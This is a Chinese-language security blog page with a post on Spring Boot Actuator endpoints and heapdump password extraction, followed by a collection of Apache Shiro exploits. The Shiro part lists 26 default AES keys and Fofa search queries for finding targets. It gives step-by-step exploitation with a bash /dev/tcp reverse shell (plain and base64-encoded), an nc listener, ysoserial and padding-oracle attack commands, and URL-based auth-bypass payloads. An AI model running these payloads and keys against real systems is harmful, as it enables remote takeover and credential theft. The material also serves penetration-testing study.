<h2 id="SpringBoot敏感目录介绍"><a href="#SpringBoot敏感目录介绍" class="headerlink" title="SpringBoot敏感目录介绍"></a>SpringBoot敏感目录介绍</h2><ul>
<li><p> <strong>/trace</strong>：显示最近的 http 包信息，可能泄露当前系统存活的 Cookie 信息。</p>
</li>
<li><p> <strong>/heapdump</strong>：JVM 内存信息，分析出明文密码。</p>
</li>
<li><p> <strong>/env、/actuator/env</strong></p>
</li>
</ul>
<p>​        应用的环境信息，包含 Profile、系统环境变量和应用的 properties 信息，可能泄露明文密码与接口信息。<strong>GET</strong> <strong>请求</strong> /env 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；同时有一定概率可以通过 <strong>POST</strong> <strong>请求</strong> /env 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。</p>
<ul>
<li>l <strong>/refresh、/actuator/refresh</strong></li>
</ul>
<p>​        POST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh 接口刷新属性变量来触发相关 RCE 漏洞。</p>
<ul>
<li> <strong>/restart、/actuator/restart</strong></li>
</ul>
<p>​        暴露出此接口的情况较少；可以配合 POST请求 /env 接口设置属性后，再 POST 请求 /restart 接口重启应用来触发相关 RCE 漏洞。</p>
<ul>
<li> <strong>/jolokia、/actuator/jolokia</strong></li>
</ul>
<p>​        可以通过 /jolokia/list 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。</p>
<ul>
<li> <strong>/trace、/actuator/httptrace</strong></li>
</ul>
<p>​        一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p>
<p>汇总：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>路径</th>
<th>描述门</th>
</tr>
</thead>
<tbody><tr>
<td>get</td>
<td>/autoconfig</td>
<td>提供了一份自动配置报告，记录哪些自动配置条件通过了，哪些没通过台</td>
</tr>
<tr>
<td>get</td>
<td>/configprops</td>
<td>描述配置属性 (包含默认值) 如何注入 Beane</td>
</tr>
<tr>
<td>get</td>
<td>/beans</td>
<td>描述应用程序上下文里全部的 Bean，以及它们的关系</td>
</tr>
<tr>
<td>get</td>
<td>/dump</td>
<td>获取线程活动的快照</td>
</tr>
<tr>
<td>get</td>
<td>/env</td>
<td>获取全部环境属性</td>
</tr>
<tr>
<td>get</td>
<td>/env/{name}</td>
<td>根据名称获取特定的环境属性值</td>
</tr>
<tr>
<td>get</td>
<td>/health</td>
<td>报告应用程序的健康指标，这些值由 Healthindicator 的实现类提供</td>
</tr>
<tr>
<td>get</td>
<td>/info</td>
<td>获取应用程序的定制信息，这些信息由 info 打头的属性提供</td>
</tr>
<tr>
<td>get</td>
<td>/mappings</td>
<td>描述全部的 URI路径，以及它们和控制器 (包含 Actuator 端点) 的映射关系</td>
</tr>
<tr>
<td>get</td>
<td>/metrics</td>
<td>报告各种应用程序度量信息，比如内存用量和 HTTP 请求计数</td>
</tr>
<tr>
<td>get</td>
<td>/metrics{name}</td>
<td>报告指定名称的应用程序度量值</td>
</tr>
<tr>
<td>post</td>
<td>/shutdown</td>
<td>关闭应用程序，要求 endpointsshutdown.enabled 设置为 true (默认为 false)</td>
</tr>
<tr>
<td>get</td>
<td>/trace</td>
<td>提供基本的 HTTP 请求跟踪信息 (时间戳、HTTP 头等)</td>
</tr>
</tbody></table>
<h2 id="HeapDump数据泄露"><a href="#HeapDump数据泄露" class="headerlink" title="HeapDump数据泄露"></a>HeapDump数据泄露</h2><h3 id="heapDump常见泄露敏感信息"><a href="#heapDump常见泄露敏感信息" class="headerlink" title="heapDump常见泄露敏感信息"></a><strong>heapDump常见泄露敏感信息</strong></h3><ul>
<li><p>各种数据库的明文密，如，mysql数据库</p>
</li>
<li><p>redis密码</p>
</li>
<li><p>Shiro的key</p>
</li>
<li><p>后台用户账号密码泄露</p>
</li>
<li><p>服务器链接的key</p>
</li>
<li><p>ssh密码</p>
</li>
</ul>
<h3 id="敏感信息提取与星号数据脱敏"><a href="#敏感信息提取与星号数据脱敏" class="headerlink" title="敏感信息提取与星号数据脱敏"></a>敏感信息提取与星号数据脱敏</h3><h4 id="方法1：用-heapdump-tool-jar-工具脱敏"><a href="#方法1：用-heapdump-tool-jar-工具脱敏" class="headerlink" title="方法1：用 heapdump_tool.jar 工具脱敏"></a><strong>方法1：用 heapdump_tool.jar 工具脱敏</strong></h4><p><strong>对 Heapdump 进行分析。</strong></p>
<p><strong>heapdump_tool.jar</strong> 是基于 jhat，通过 jhat 解析 heapdump 文件，所以建议 jdk 版本为 1.8。<br> 使用方法：*<strong>java -jar heapdump_tool.jar heapdump*</strong><br> 查询方式：</p>
<ul>
<li>关键词：如 password</li>
<li> 字符长度：如 len=10 获取长度为 10 的所有 key 或者 value 值</li>
<li>按顺序获取 ：如 num=1-100 获取顺序 1-100 的字符</li>
<li>命令：</li>
</ul>
<p>​            geturl：获取所有字符串中的 url</p>
<p>​            getfile：获取所有字符串中的文件路径文件名</p>
<p>​            getip：获取所有字符串中的 ip</p>
<p><em>默认不输出查询结果非 key-value 格式的数据，需要获取所有值，输入all=true、all=false取消显示所有值。</em></p>
<p>*<em>根据/env的星星敏感数据进行搜索查询**</em></p>
<p><img src="/2023/08/13/SpringBoot%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20230813203654640.png" alt="image-20230813203654640">     </p>
<p> <img src="/2023/08/13/SpringBoot%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20230813203659487.png" alt="image-20230813203659487"></p>
<h4 id="方法2：利用MemoryAnalyzer可视化工具"><a href="#方法2：利用MemoryAnalyzer可视化工具" class="headerlink" title="方法2：利用MemoryAnalyzer可视化工具"></a>方法2：利用MemoryAnalyzer可视化工具</h4><p>查询语法：<code>select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</code></p>
<p><img src="/2023/08/13/SpringBoot%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/image-20230814201949831.png" alt="image-20230814201949831"></p>
<p>其他脱敏方法可以参考文章：<a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/" class="post-title-link" itemprop="url">shiro反序列化漏洞集合</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-08-13 18:00:08" itemprop="dateCreated datePublished" datetime="2023-08-13T18:00:08+08:00">2023-08-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-08-14 20:16:08" itemprop="dateModified" datetime="2023-08-14T20:16:08+08:00">2023-08-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">实战漏洞</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Shiro反序列漏洞集合"><a href="#Shiro反序列漏洞集合" class="headerlink" title="Shiro反序列漏洞集合"></a>Shiro反序列漏洞集合</h1><p><strong>免责声明</strong></p>
<p>​        <strong>本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为</strong>。</p>
<h2 id="漏洞介绍与知识补充"><a href="#漏洞介绍与知识补充" class="headerlink" title="漏洞介绍与知识补充"></a>漏洞介绍与知识补充</h2><p>​    Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。</p>
<p><strong>【已知指纹</strong>】</p>
<p>若依CMS、TIMO后台管理系统</p>
<p>Bp抓包：在登陆界面勾线记住密码，进行抓包，找remeberMe字段。</p>
<p>【<strong>Fofa语法</strong>】</p>
<ul>
<li><p> “shiro” &amp;&amp;“管理系统”</p>
</li>
<li><p> header=“rememberme=deleteMe”、header=“shiroCookie”</p>
</li>
</ul>
<p>【<strong>注意</strong>】shiro反序列化漏洞并不需要正确的账号密码，触发漏洞的点是在于反序列化过程，需要密钥Key，是因为要把攻击payload解密回正确的payload（否则解密出乱码）；然后利用反序列化的利用链进行触发反序列化漏洞。</p>
<p><strong>Shiro默认key集合</strong></p>
<table>
<thead>
<tr>
<th>序号</th>
<th>shiro版本</th>
<th>默认密钥</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td></td>
<td>kPH+bIxk5D2deZiIxcaaaA==</td>
</tr>
<tr>
<td>2</td>
<td></td>
<td>4AvVhmFLUs0KTA3Kprsdag==</td>
</tr>
<tr>
<td>3</td>
<td></td>
<td>3AvVhmFLUs0KTA3Kprsdag==</td>
</tr>
<tr>
<td>4</td>
<td></td>
<td>2AvVhdsgUs0FSA3SDFAdag==</td>
</tr>
<tr>
<td>5</td>
<td></td>
<td>6ZmI6I2j5Y+R5aSn5ZOlAA==</td>
</tr>
<tr>
<td>6</td>
<td></td>
<td>wGiHplamyXlVB11UXWol8g==</td>
</tr>
<tr>
<td>7</td>
<td></td>
<td>cmVtZW1iZXJNZQAAAAAAAA==</td>
</tr>
<tr>
<td>8</td>
<td></td>
<td>Z3VucwAAAAAAAAAAAAAAAA==</td>
</tr>
<tr>
<td>9</td>
<td></td>
<td>ZnJlc2h6Y24xMjM0NTY3OA==</td>
</tr>
<tr>
<td>10</td>
<td></td>
<td>L7RioUULEFhRyxM7a2R/Yg==</td>
</tr>
<tr>
<td>11</td>
<td></td>
<td>RVZBTk5JR0hUTFlfV0FPVQ==</td>
</tr>
<tr>
<td>12</td>
<td></td>
<td>fCq+/xW488hMTCD+cmJ3aQ==</td>
</tr>
<tr>
<td>13</td>
<td></td>
<td>WkhBTkdYSUFPSEVJX0NBVA==</td>
</tr>
<tr>
<td>14</td>
<td></td>
<td>1QWLxg+NYmxraMoxAXu/Iw==</td>
</tr>
<tr>
<td>15</td>
<td></td>
<td>WcfHGU25gNnTxTlmJMeSpw==</td>
</tr>
<tr>
<td>16</td>
<td></td>
<td>a2VlcE9uR29pbmdBbmRGaQ==</td>
</tr>
<tr>
<td>17</td>
<td></td>
<td>bWluZS1hc3NldC1rZXk6QQ==</td>
</tr>
<tr>
<td>18</td>
<td></td>
<td>5aaC5qKm5oqA5pyvAAAAAA==</td>
</tr>
<tr>
<td>19</td>
<td></td>
<td>ZWvohmPdUsAWT3=KpPqda</td>
</tr>
<tr>
<td>20</td>
<td></td>
<td>r0e3c16IdVkouZgk1TKVMg==</td>
</tr>
<tr>
<td>21</td>
<td></td>
<td>ZUdsaGJuSmxibVI2ZHc9PQ==</td>
</tr>
<tr>
<td>22</td>
<td></td>
<td>U3ByaW5nQmxhZGUAAAAAAA==</td>
</tr>
<tr>
<td>23</td>
<td></td>
<td>LEGEND-CAMPUS-CIPHERKEY==</td>
</tr>
<tr>
<td>24</td>
<td></td>
<td>kPv59vyqzj00x11LXJZTjJ2UHW48jzHN</td>
</tr>
<tr>
<td>25</td>
<td></td>
<td>LEGEND-CAMPUS-CIPHERKEY==</td>
</tr>
<tr>
<td>26</td>
<td></td>
<td>kPv59vyqzj00x11LXJZTjJ2UHW48jzHN</td>
</tr>
</tbody></table>
<h2 id="RememberMe-RCE-550（CVE-2016-4437）"><a href="#RememberMe-RCE-550（CVE-2016-4437）" class="headerlink" title="RememberMe RCE-550（CVE-2016-4437）"></a>RememberMe RCE-550（CVE-2016-4437）</h2><h3 id="0x01-漏洞介绍-原理"><a href="#0x01-漏洞介绍-原理" class="headerlink" title="0x01 漏洞介绍/原理"></a>0x01 漏洞介绍/原理</h3><p>​        Apache Shiro框架提供了记住我（RememberMe）的功能，关闭浏览器再次访问时无需再登录即可访问。shiro默认使用CookieRememberMeManager对rememberMe的cookie执行操作在客户端进行，如操作j，服务器端识别身份解密处理cookie的流程为操作k：</p>
<ul>
<li><p><strong>（客户端/浏览器）操作j：序列化⟶AES加密⟶Base64编码</strong></p>
</li>
<li><p><strong>（服务器）操作</strong>k<strong>：获取rememberMe cookie⟶base64 解码⟶AES解密（加密密钥硬编码）⟶反序列化（未作过滤处理）</strong></p>
</li>
</ul>
<p>【<strong>漏洞所在</strong>】</p>
<p>​        AES加密的默认密钥Key写死在官方的代码里(密钥初始就被定义好不能动态改变的)，这就意味着可以通过源代码都能拿到AES加密的默认密钥。因此，攻击者可以构造一个恶意的对象，并且对其序列化、AES加密、base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终就造成了反序列化的RCE漏洞。只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都可能会导致该漏洞的产生。</p>
<h3 id="0x02-漏洞环境-测绘指纹"><a href="#0x02-漏洞环境-测绘指纹" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><p>Apache Shiro &lt;= 1.2.4</p>
<p>指纹：shiro通用指纹</p>
<h3 id="0x03-POC-EXP-漏洞利用"><a href="#0x03-POC-EXP-漏洞利用" class="headerlink" title="0x03 POC/EXP/漏洞利用"></a>0x03 POC/EXP/漏洞利用</h3><ul>
<li><strong>步骤1：制作bash反弹shell</strong></li>
</ul>
<p><strong>执行命令/shell</strong>：<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/63497 0&gt;&amp;1</code>    #监听ip，监听端口</p>
<p><strong>Base64编码</strong>：</p>
<p><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8yNy4xNTUuODcuODkvMzI0NjAgMD4mMQ==</code></p>
<p><strong>反弹Shell/payload</strong>：</p>
<p><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yNy4xNTUuODcuODkvMzI0NjAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
<ul>
<li> <strong>步骤2：使用工具（shiro_exp.py）执行bash反弹shell</strong></li>
</ul>
<p>攻击者监听端口：<code>nc -lvvp 4444</code></p>
<p>执行攻击，payload如下：</p>
<p><code>Python .\exp.py -t -u http://目标ip：端口/doLogin -p ‘bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yNy4xNTUuODcuODkvMzI0NjAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813181426684.png" alt="image-20230813181426684">                    </p>
<p>反弹shell成功</p>
<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813181439922.png" alt="image-20230813181439922"></p>
<h2 id="远程安全限制绕过漏洞（CVE-2016-6802）"><a href="#远程安全限制绕过漏洞（CVE-2016-6802）" class="headerlink" title="远程安全限制绕过漏洞（CVE-2016-6802）"></a>远程安全限制绕过漏洞（CVE-2016-6802）</h2><h3 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p><strong>【漏洞类型</strong>】：未授权访问</p>
<p>​        shiro在路径控制的时候，未能对传入的url编码进行decode解码，导致攻击者可以绕过过滤器，访问被过滤的路径。</p>
<h3 id="0x02-漏洞环境-测绘指纹-1"><a href="#0x02-漏洞环境-测绘指纹-1" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><p>shrio &lt;1.3.2</p>
<h3 id="0x03-POC-EXP-漏洞利用-1"><a href="#0x03-POC-EXP-漏洞利用-1" class="headerlink" title="0x03 POC/EXP/漏洞利用"></a>0x03 POC/EXP/漏洞利用</h3><p>​        访问某shrio某些敏感url的时候（如/admin），页面返回403（未授权）。因此可以确定admin路径是属于被过滤路径。此时使用burp截断，然后在访问路径的最后添加%2f，既可绕过shiro检测。因为对于浏览器来说%2f会被自动编码为/，但是burp截断之后进入shiro，shiro未对其解码，所以可以绕过。</p>
<h2 id="Padding-Oracle-AttackRCE-721（CVE-2019-12422）"><a href="#Padding-Oracle-AttackRCE-721（CVE-2019-12422）" class="headerlink" title="Padding Oracle AttackRCE-721（CVE-2019-12422）"></a>Padding Oracle AttackRCE-721（CVE-2019-12422）</h2><h3 id="0x01-漏洞介绍-1"><a href="#0x01-漏洞介绍-1" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>​        shrio中的remenbermecookie字段是采用AES-128-CBC加密的，因此容易受到oracle填充攻击，攻击者可以采用有效的cookie字段来作为paddingoracleattack的前缀，然后精心构造反序列化字段进行命令执行。</p>
<h3 id="0x02-漏洞环境-测绘指纹-2"><a href="#0x02-漏洞环境-测绘指纹-2" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><ul>
<li><p>Apache     Shiro： 1.2.5, 1.2.6, 1.3.0, 1.3.1,     1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1</p>
</li>
<li><p>利用的前提：需要能够获取正常的remenberMe的cookie，所以我们需要进入后台，获取正常的cookie</p>
</li>
</ul>
<h3 id="0x03-POC-EXP-漏洞利用-2"><a href="#0x03-POC-EXP-漏洞利用-2" class="headerlink" title="0x03 POC/EXP/漏洞利用"></a>0x03 POC/EXP/漏洞利用</h3><ul>
<li><strong>步骤1：ysoserial生成反序列化payload</strong></li>
</ul>
<p>执行：<code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/4444 0&gt;&amp;1’ &gt; linux_shell.class</code></p>
<p>工具包： ysoserial-0.0.6-SNAPSHOT-all.jar</p>
<p>得到payload</p>
<p>CVLt9Uxe8Y+wYtBAg8OqeYytEKI04csCy916LpA8ndWPk0GHmv7iFB8nZIsnZmS00MLpOgHQD3+KRUlVQA09b7HFgios2tfD3ja6dKwoE4n4Y6h6tX2oZMwedIpmIBp59a6V8qqSk9chl1epO9up3ZJKrvQLs6CgRoA10Q4ZK0Jy00DQmFWWAvNI22tf4P68R/i2jOSSZ3+0KXme04jIWbYjcY7jVtD8RqehLDjHVxARWp8LVROQhHov2Gk2pEbXQs5MTF7sw1Nf6gcP6B1JizNWNvy23D0QVlGCqwu3qvwDaC2WUZm87DUr3fsOY6yOaDBk/Gpx1G6RJHN8LHJQ8zJVUfPJTX156B2ABq00xtCrXxjOWQpDVCrqjRoNHZ3qYVDITv7k/1Tmmwgayjv8F5nWLP+feY+oKIjt+eW5JVs0Ky2hbjDHin8KefdcuA+wK34NFyIbZi0abIjhKmqval5h/IjE6xMiGcA3Dsi/cuJGhHp0YbcWYuyxAfVCa15V</p>
<ul>
<li><strong>步骤2（方式1）：使用PaddingOracleAttack-1.0-SNAPSHOT.jar进行漏洞利用</strong></li>
</ul>
<p><code>java -jar PaddingOracleAttack-1.0-SNAPSHOT.jar http://xx.xx.xx.xx:8080/</code> CVLt9Uxe8Y+wYtBAg8OqeYytEKI04csCy916LpA8ndWPk0GHmv7iFB8nZIsnZmS00MLpOgHQD3+KRUlVQA09b7HFgios2tfD3ja6dKwoE4n4Y6h6tX2oZMwedIpmIBp59a6V8qqSk9chl1epO9up3ZJKrvQLs6CgRoA10Q4ZK0Jy00DQmFWWAvNI22tf4P68R/i2jOSSZ3+0KXme04jIWbYjcY7jVtD8RqehLDjHVxARWp8LVROQhHov2Gk2pEbXQs5MTF7sw1Nf6gcP6B1JizNWNvy23D0QVlGCqwu3qvwDaC2WUZm87DUr3fsOY6yOaDBk/Gpx1G6RJHN8LHJQ8zJVUfPJTX156B2ABq00xtCrXxjOWQpDVCrqjRoNHZ3qYVDITv7k/1Tmmwgayjv8F5nWLP+feY+oKIjt+eW5JVs0Ky2hbjDHin8KefdcuA+wK34NFyIbZi0abIjhKmqval5h/IjE6xMiGcA3Dsi/cuJGhHp0YbcWYuyxAfVCa15V 16 shell.class</p>
<p>得到破解结果后burpsuite重放替换cookie后的数据包，成功反弹shell</p>
<ul>
<li><strong>步骤2（方式2）：使用shiro_exp.py进行漏洞利用</strong></li>
</ul>
<p>python2 shiro_exp.py <a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:8080/samples-web-1.4.1/home.jspCVLt9Uxe8Y+wYtBAg8OqeYytEKI04csCy916LpA8ndWPk0GHmv7iFB8nZIsnZmS00MLpOgHQD3+KRUlVQA09b7HFgios2tfD3ja6dKwoE4n4Y6h6tX2oZMwedIpmIBp59a6V8qqSk9chl1epO9up3ZJKrvQLs6CgRoA10Q4ZK0Jy00DQmFWWAvNI22tf4P68R/i2jOSSZ3+0KXme04jIWbYjcY7jVtD8RqehLDjHVxARWp8LVROQhHov2Gk2pEbXQs5MTF7sw1Nf6gcP6B1JizNWNvy23D0QVlGCqwu3qvwDaC2WUZm87DUr3fsOY6yOaDBk/Gpx1G6RJHN8LHJQ8zJVUfPJTX156B2ABq00xtCrXxjOWQpDVCrqjRoNHZ3qYVDITv7k/1Tmmwgayjv8F5nWLP+feY+oKIjt+eW5JVs0Ky2hbjDHin8KefdcuA+wK34NFyIbZi0abIjhKmqval5h/IjE6xMiGcA3Dsi/cuJGhHp0YbcWYuyxAfVCa15V">http://xx.xx.xx.xx:8080/samples-web-1.4.1/home.jspCVLt9Uxe8Y+wYtBAg8OqeYytEKI04csCy916LpA8ndWPk0GHmv7iFB8nZIsnZmS00MLpOgHQD3+KRUlVQA09b7HFgios2tfD3ja6dKwoE4n4Y6h6tX2oZMwedIpmIBp59a6V8qqSk9chl1epO9up3ZJKrvQLs6CgRoA10Q4ZK0Jy00DQmFWWAvNI22tf4P68R/i2jOSSZ3+0KXme04jIWbYjcY7jVtD8RqehLDjHVxARWp8LVROQhHov2Gk2pEbXQs5MTF7sw1Nf6gcP6B1JizNWNvy23D0QVlGCqwu3qvwDaC2WUZm87DUr3fsOY6yOaDBk/Gpx1G6RJHN8LHJQ8zJVUfPJTX156B2ABq00xtCrXxjOWQpDVCrqjRoNHZ3qYVDITv7k/1Tmmwgayjv8F5nWLP+feY+oKIjt+eW5JVs0Ky2hbjDHin8KefdcuA+wK34NFyIbZi0abIjhKmqval5h/IjE6xMiGcA3Dsi/cuJGhHp0YbcWYuyxAfVCa15V</a> shell.class</p>
<ul>
<li><strong>步骤2-1：经过漫长的时间后得到cookie，然后替代刚抓包的cookie，重放即可</strong></li>
</ul>
<h2 id="Shiro-spring时身份验证绕过漏洞分析（CVE-2020-1957）"><a href="#Shiro-spring时身份验证绕过漏洞分析（CVE-2020-1957）" class="headerlink" title="Shiro + spring时身份验证绕过漏洞分析（CVE-2020-1957）"></a>Shiro + spring时身份验证绕过漏洞分析（CVE-2020-1957）</h2><h3 id="0x01-漏洞介绍-2"><a href="#0x01-漏洞介绍-2" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>【<strong>漏洞类型</strong>】未授权访问（绕过）</p>
<h3 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h3><p>【<strong>知识补充1】Shiro拦截器</strong></p>
<p>​        Shiro框架通过拦截器功能来实现对用户访问权限的控制和拦截。Shiro中常见的拦截器有anon,authc等拦截器。</p>
<ul>
<li><p><strong>anon匿名拦截器</strong>，不需要登录就能访问，一般用于静态资源,或者移动端接口</p>
</li>
<li><p> <strong>authc登录拦截器</strong>，需要登录认证才能访问的资源。</p>
</li>
</ul>
<p>配置示例</p>
<p>​        index.html = anon</p>
<p>​        /user/** = authc</p>
<p>​        访问 /index.html主页的时候，Shiro将不会对其进行登录判断，anon拦截器不需要登录就能进行访问。而对于/user/xiaoming 等 /user/xiaogang等接口，authc拦截器将会对其进行登录判断，有登录认证才能访问资源。</p>
<p>【<strong>知识补充2</strong>】Ant 格式的url</p>
<p><strong>路径通配符</strong></p>
<ul>
<li><p> **?**：匹配一个字符</p>
</li>
<li><p> *****：匹配零个或多个字符串</p>
</li>
<li><p> <strong>**</strong>：匹配路径中的零个或多个路径</p>
</li>
<li><p> <strong>;</strong> <strong>：</strong>截段分隔符</p>
</li>
</ul>
<p>【<strong>原理</strong>】</p>
<p>​     <strong>一句话总结：若访问/hello/1需要授权，但用/hello/1/可以绕过shiro路径匹配函数，到spring拦截器时，/hello/1/与/hello/1是一样的。</strong>具体原理细节如下：</p>
<p>​        Shiro处理url时，会调用PathMatchingFilterChainResolver的getChain函数，<strong>getChain函数根</strong>据URL路径匹配中配置的url路径表达式来匹配输入的URL，判断是否匹配拦截器，匹配成功将会返回响应的拦截器执行链，让ShiroFither执行权限操作的。</p>
<p>​        getChain主要通过<strong>pathMathches函数</strong>进行匹配路径表达式。pathMatches函数最终会调用shiro.util.AntPathMatcher类中的<strong>doMatch</strong>对于ant格式的pathPattern和requestURI进行匹配。</p>
<p>​        而Shiro 的Ant格式的<strong>pathPattern</strong> 中的的“*”通配符是不支持匹配路径的，所以/hello/*****不能成功匹配/hello/1/，也就不会触发authc拦截器进行权限拦截。从而成功绕过了Shiro拦截器，而后再进入到spring拦截器中，/hello/1/与/hello/1能获取到相同的资源。</p>
<p><strong>【关系链】</strong>：<strong>PathMatchingFilterChainResolver（url处理）⟶ getChain函数（权限判定）⟶ pathMatches函数（url匹配）⟶pathPattern匹配失败而绕过shiro拦截器。</strong></p>
<p>{“⟶”代表引用/调用关系}</p>
<h3 id="0x03-漏洞环境-测绘指纹"><a href="#0x03-漏洞环境-测绘指纹" class="headerlink" title="0x03 漏洞环境/测绘指纹"></a>0x03 漏洞环境/测绘指纹</h3><ul>
<li>JIRA     issueSHIRO-682</li>
<li>Shiro     &lt; 1.5.0</li>
</ul>
<h3 id="0x04-POC-EXP-漏洞利用"><a href="#0x04-POC-EXP-漏洞利用" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h3><p>​        /*<em>可以匹配/hello，但匹配不到/hello/；因为</em>通配符无法匹配路径。假设/hello接口设置了authc拦截器，访问/hello将会被进行权限判断，如果请求的URI为/hello/，/*URL路径表达式将无法正确匹配，就会放行。然后进入到spring(Servlet)拦截器，spring中/hello形式和/hello/形式的URL访问的资源是一样的。</p>
<h3 id="0x05漏洞修复"><a href="#0x05漏洞修复" class="headerlink" title="0x05漏洞修复"></a>0x05漏洞修复</h3><p>​        shiro1.5版本修复了pathsMatch函数。修复方式是通过判断requestURI是否以/为结尾，如果以/结尾的话，则去掉尾部的/符号在与URL表达式进行比较。</p>
<p>​        那么，当requestURI为/hello/1/等以/为结尾的URI的时候，都会被清除最后的/号，再进行URL路径匹配，那么/hello/1/就会被处理为/hello/1，然后需要授权认证才能访问。</p>
<h2 id="Apache-Shiro-628权限绕过漏洞-（CVE-2020-2957）"><a href="#Apache-Shiro-628权限绕过漏洞-（CVE-2020-2957）" class="headerlink" title="Apache Shiro 628权限绕过漏洞 （CVE-2020-2957）"></a>Apache Shiro 628权限绕过漏洞 （CVE-2020-2957）</h2><h3 id="0x01-漏洞介绍-3"><a href="#0x01-漏洞介绍-3" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>​        CVE-2020-1957身份认证绕过漏洞修复不完全，CVE-2020-2957是漏洞在之前CVE-2020-1957补丁的基础上进行绕过，访问/hello/1/会进入登录认证，但是通过构造payload:/fdsf;/…/hello/1可以绕过登录认证。</p>
<h3 id="0x02-漏洞环境-测绘指纹-3"><a href="#0x02-漏洞环境-测绘指纹-3" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><ul>
<li>Shiro     &lt;= 1.5.1</li>
</ul>
